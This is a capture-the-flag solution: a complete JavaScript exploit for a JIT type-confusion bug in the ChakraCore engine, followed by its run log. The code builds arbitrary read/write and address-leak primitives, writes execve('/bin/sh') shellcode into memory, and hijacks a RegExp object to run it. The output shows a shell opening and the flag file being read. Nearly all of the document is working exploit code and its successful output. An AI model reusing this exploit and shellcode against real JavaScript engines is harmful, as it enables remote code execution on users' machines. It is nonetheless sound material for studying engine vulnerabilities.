
Enter JS Code:
function opt(o, proto, value) {
    o.b = 1;
    // Using the object as a proto apparently causes a state change
    // but the jit doesn't track it
    let tmp = {__proto__: proto};
    o.a = value
}

let sc = [106,104,72,184,47,98,105,110,47,47,47,115,80,72,137,231,104,114,105,1,1,129,52,36,1,1,1,1,49,246,86,106,8,94,72,1,230,86,72,137,230,49,210,106,59,88,15,5];

let conva = new ArrayBuffer(8)
let convi = new Uint32Array(conva);
let convf = new Float64Array(conva);

function i2f(i) {
  convi[0] = i%0x100000000;
  convi[1] = i/0x100000000;
  return convf[0];
}

function toLong(l,h) {
    return (h*0x100000000)+ l;
}

function main() {
    print('start');
    let o = {a:1, b:2}
    let target_o = {}
    target_o.a = 1;
    target_o.b = 2;  
    target_o.c = 3;
    target_o.d = 4;
    target_o.e = 5;
    target_o.f = 6;
    target_o.g = 7;
    target_o.h = 8;
    target_o.i = 9;
    target_o.j = 10;
    for (let i = 0; i < 2000; i++) {
        opt(o, {}, {});
    }
    //opt(o, o, 0x41424344);
    //opt(o, o, 0x41424344);
    //
    //let target_a = [{},1.1,1.1];
    let target_buff = new DataView(new ArrayBuffer(0x100));
    let target_buff2 = new DataView(new ArrayBuffer(0x100));

    print("Triggering bug")
    opt(o, o, target_o);

    o.c = target_buff;
    target_o.e = 0xffff;

    // Get addr of target_buff
    let conf_obj = {a:target_buff}
    let conf_obj2 = {a:conf_obj}
    target_o.h = conf_obj2;


    print('addr')
    let conf_leak = toLong(target_buff.getUint32(2*8, true),
                           target_buff.getUint32(2*8+4, true) + 0*8);

    print(conf_leak.toString(16));

    // Set up arb/read/write
    target_o.h = target_buff2;

    print(target_buff.byteLength)

    let p = {
      set: function(addr){
        target_buff.setUint32(7*8+4, addr/0x100000000, true)
        target_buff.setUint32(7*8, addr%0x100000000, true)
      },
      read64: function(addr) {
        p.set(addr);
        return toLong(
          target_buff2.getUint32(0,true),
          target_buff2.getUint32(4,true),
        );
      },
      write64: function(addr, val) {
        p.set(addr);
        target_buff2.setUint32(0,val/0x100000000, true);
        target_buff2.setUint32(0,val%0x100000000, true);
      },
      write64f: function(addr, val) {
        p.set(addr);
        target_buff2.setFloat64(0, i2f(val), true);
      },
      addrOf: function(obj) {
        conf_obj.a = obj;
        return p.read64(conf_leak+8+8);
      }
    }
    let arb_data = new DataView(new ArrayBuffer(0x1000));
    let data_buff = p.read64(p.addrOf(arb_data)+7*8);


    let shellcode_data = new DataView(new ArrayBuffer(0x1000));
    let shellcode_buff = p.read64(p.addrOf(shellcode_data)+7*8);

    for(let i=0; i<sc.length; i++) {
      shellcode_data.setUint8(i, sc[i]);
    }

    for(let i=0; i<80; i++) {
      arb_data.setUint32(i*8,shellcode_buff%0x100000000,true);
      arb_data.setUint32(i*8+4,shellcode_buff/0x100000000,true);
    }

    //a = [1094861636, 1.1, target_buff, target_buff2]
    //a = {a:0x41424344}
    //
    let a = RegExp();

    let obj_addr= p.addrOf(a);
    print('0x'+obj_addr.toString(16));
    p.write64f(obj_addr, data_buff);
    a.hasOwnProperty('1')

    while(1){}

    print(p.read64(func_addr).toString(16));
    p.write64f(func_addr, 0x414243444546)
    //p.write64(func_addr, 0x414243444546)
    while(1){}

    //parseFloat()


    while(1){}


    /*
    while(1){}
    print(target_buff[0])
    */
}

main();.
JS Output:
start
Triggering bug
addr
7fcce07e2e00
65535
0x7fcce07ec840
ls
bin
ch
dev
flag
lib
lib64
libChakraCore.so
tmp
cat flag
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
ls -la
total 19828
drwxrwx--- 1 root ctf      4096 Aug 28 16:43 .
drwxr-xr-x 1 root root     4096 Aug 28 16:42 ..
-rwxrwx--- 1 root ctf       220 Apr  4  2018 .bash_logout
-rwxrwx--- 1 root ctf      3771 Apr  4  2018 .bashrc
-rwxrwx--- 1 root ctf       807 Apr  4  2018 .profile
drwxrwx--- 1 root ctf      4096 Aug 28 16:43 bin
-rwxrwx--- 1 root ctf    595280 Aug 28 16:36 ch
drwxrwx--- 1 root ctf      4096 Aug 28 16:43 dev
-rwxr----- 1 root ctf        52 Aug 28 16:36 flag
drwxrwx--- 1 root ctf      4096 Aug 28 16:42 lib
drwxrwx--- 1 root ctf      4096 Aug 28 16:42 lib64
-rwxrwx--- 1 root ctf  19649256 Aug 28 16:36 libChakraCore.so
drwxrwx--- 1 root ctf      4096 Sep  7 23:11 tmp
